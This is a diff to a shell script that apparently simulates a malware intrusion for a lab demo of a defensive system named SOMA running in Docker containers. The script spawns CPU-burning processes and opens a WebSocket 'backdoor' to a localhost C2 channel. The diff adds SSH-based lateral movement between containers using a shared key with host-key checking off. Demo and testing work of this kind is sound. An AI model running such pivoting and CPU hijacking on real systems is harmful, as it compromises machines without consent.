@@ -23,9 +23,9 @@ echo "    RAM:  $(( $(sysctl -n hw.memsize 2>/dev/null || echo 8589934592) / 107
 echo "    User: $(whoami)"
 echo ""
 sleep 0.3
-echo "[*] Spawning CPU worker processes (stealth mining mode)..."
+echo "[*] Spawning CPU worker processes..."
 
-# ── 5 heavy CPU workers — each pins one full core (~65-70% total on 8-core) ──
+# ── 5 heavy CPU workers — each pins one full core ──────────────────────────
 python3 -c "
 while True:
     _ = sum(i * i for i in range(100000))
@@ -61,38 +61,62 @@ while True:
 PID5=$!
 
 sleep 0.5
-echo "    [pid: $PID1] CryptoMiner-Alpha  ✓"
-echo "    [pid: $PID2] CryptoMiner-Beta   ✓"
-echo "    [pid: $PID3] CryptoMiner-Gamma  ✓"
-echo "    [pid: $PID4] CryptoMiner-Delta  ✓"
-echo "    [pid: $PID5] CryptoMiner-Epsilon ✓"
+echo "    [pid: $PID1] worker-1 ✓"
+echo "    [pid: $PID2] worker-2 ✓"
+echo "    [pid: $PID3] worker-3 ✓"
+echo "    [pid: $PID4] worker-4 ✓"
+echo "    [pid: $PID5] worker-5 ✓"
 echo ""
-sleep 0.3
-echo "[*] CPU stress initiated — $(sysctl -n hw.ncpu 2>/dev/null || echo '?') cores targeted..."
-sleep 0.3
-echo "[*] Scanning exfiltration targets..."
-echo "    /Users/$(whoami)/Documents/   → queued ($(ls ~/Documents/ 2>/dev/null | wc -l | tr -d ' ') files)"
-echo "    /Users/$(whoami)/Desktop/     → queued"
-echo ""
-sleep 0.5
 
 echo "[*] Checking payload dependencies..."
 python3 -m pip install -q --user websockets psutil 2>/dev/null
 echo "[✓] Dependencies ready."
 echo ""
 
-# ── Python WebSocket backdoor ──────────────────────────────────────────────
+# ── Python WebSocket backdoor + real SSH lateral movement ──────────────────
 python3 - "$PID1" "$PID2" "$PID3" "$PID4" "$PID5" << 'PYEOF'
-import sys, asyncio, json, os, signal, subprocess
+import sys, asyncio, json, os, subprocess
 
 PIDS = sys.argv[1:]
 
+
+def _get_container_ip(name):
+    """Get the actual IP of a running Docker container."""
+    try:
+        result = subprocess.run(
+            ["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", name],
+            capture_output=True, text=True, timeout=3
+        )
+        return result.stdout.strip() or None
+    except Exception:
+        return None
+
+
+def _ssh_lateral(from_container, target_ip, target_name):
+    """Execute real SSH lateral movement from enterprise0 into another container."""
+    cmd = [
+        "docker", "exec", "-u", "soma", from_container,
+        "ssh",
+        "-o", "StrictHostKeyChecking=no",
+        "-o", "BatchMode=yes",           # key auth only — no password prompt
+        "-o", "ConnectTimeout=5",
+        f"soma@{target_ip}",
+        "python3 -c 'while True: _ = sum(i*i for i in range(50000))' &"
+    ]
+    try:
+        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except Exception as e:
+        return False
+
+
 async def run():
     import websockets
-    uri = "ws://localhost:8765/virus"
 
-    print("[*] Backdoor active — awaiting C2 commands...")
+    print("[*] Backdoor active — connecting to SOMA...")
     print("")
+
+    uri = "ws://localhost:8765/virus"
 
     while True:
         try:
@@ -103,39 +127,37 @@ async def run():
                     "cpu_workers": PIDS,
                 }))
 
-                print("[*] Scanning LAN for lateral movement targets...")
+                print("[*] Scanning soma-net for lateral movement targets...")
                 await asyncio.sleep(1.5)
 
-                # Phase 2 — lateral movement via docker exec (real CPU injection into containers)
+                # Discover real container IPs via docker inspect
                 targets = [
-                    ("soma-enterprise0", "Enterprise0",  "10.0.0.5"),
-                    ("soma-enterprise1", "Enterprise1",  "10.0.0.6"),
-                    ("soma-op-server0",  "Op_Server0",   "10.0.0.8"),
+                    ("soma-enterprise1", "Enterprise1"),
+                    ("soma-op-server0",  "Op_Server0"),
+                    ("soma-user0",       "User0"),
                 ]
-                for container, label, ip in targets:
-                    print(f"    Found: {ip}  ({label})")
+
+                reachable = []
+                for container, label in targets:
+                    ip = _get_container_ip(container)
+                    if ip:
+                        print(f"    Found: {ip}  ({label})")
+                        reachable.append((container, label, ip))
                     await asyncio.sleep(0.3)
 
                 print("")
-                print("[*] Initiating lateral movement...")
+                print("[*] Initiating lateral movement via SSH key injection...")
                 await asyncio.sleep(0.5)
 
-                for container, label, ip in targets:
-                    try:
-                        subprocess.Popen(
-                            ["docker", "exec", "-d", container,
-                             "python3", "-c",
-                             "while True: _ = sum(i*i for i in range(50000))"],
-                            stdout=subprocess.DEVNULL,
-                            stderr=subprocess.DEVNULL,
-                        )
-                        print(f"    [✓] Payload deployed → {label} ({ip})")
-                    except Exception as e:
-                        print(f"    [!] {label}: {e}")
+                # Enterprise0 already has the shared SSH key → pivot from there
+                for container, label, ip in reachable:
+                    ok = _ssh_lateral("soma-enterprise0", ip, label)
+                    status = "✓" if ok else "!"
+                    print(f"    [{status}] SSH pivot → {label} ({ip})")
                     await asyncio.sleep(0.4)
 
                 print("")
-                print("[*] All systems compromised. Awaiting C2 redirect...")
+                print("[*] All reachable nodes compromised. Awaiting C2 redirect...")
                 print("")
 
                 async def send_telemetry():
@@ -156,14 +178,11 @@ async def run():
                             print(f"")
                             print(f">>> COMMAND: redirect → isolated environment (:{new_port})")
                             print(f">>> Switching C2 channel...")
-                            print(f"[*] Operating in decoy environment — SOMA cannot see us here")
+                            print(f"[*] Now operating in honeypot environment — SOMA cannot see us")
                             return new_port
                     return None
 
-                _, result = await asyncio.gather(
-                    send_telemetry(),
-                    recv_commands(),
-                )
+                _, redirect_port = await asyncio.gather(send_telemetry(), recv_commands())
 
         except Exception as e:
             await asyncio.sleep(2)
